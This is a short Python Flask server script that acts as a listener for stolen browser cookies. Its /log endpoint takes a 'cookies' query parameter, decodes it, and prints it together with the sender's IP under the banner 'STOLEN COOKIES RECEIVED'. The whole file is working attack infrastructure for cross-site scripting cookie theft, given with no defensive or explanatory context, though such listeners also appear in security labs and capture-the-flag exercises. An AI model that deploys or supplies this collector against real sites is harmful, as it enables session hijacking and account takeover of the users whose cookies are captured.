from flask import Flask, request, Response
import urllib.parse

app = Flask(__name__)

@app.route('/log', methods=['GET'])
def log_cookies():
    # extract the 'cookies' parameter from the query string
    stolen_cookies = request.args.get('cookies', 'No cookies found')
    decoded_cookies = urllib.parse.unquote(stolen_cookies)
    
    # print the stolen cookies to the screen
    print("\n" + "="*50)
    print("[!] STOLEN COOKIES RECEIVED!")
    print(f"[+] From IP: {request.remote_addr}")
    print(f"[+] Data: {decoded_cookies}")
    print("="*50 + "\n")

    # respond with a simple message        
    return Response("OK", status=200)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)